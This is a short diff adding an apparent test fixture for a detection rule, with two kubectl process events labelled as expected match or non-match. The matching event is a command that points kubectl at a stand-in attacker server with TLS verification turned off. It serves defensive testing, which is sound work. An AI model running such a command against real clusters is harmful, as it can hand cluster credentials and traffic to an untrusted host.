@@ -1,0 +1,4 @@
+[
+  {"expect_match": true, "event": {"Image": "/usr/local/bin/kubectl", "CommandLine": "kubectl get pods --server=https://attacker.example.com --insecure-skip-tls-verify=true"}},
+  {"expect_match": false, "event": {"Image": "/usr/local/bin/kubectl", "CommandLine": "kubectl get pods -n default"}}
+]
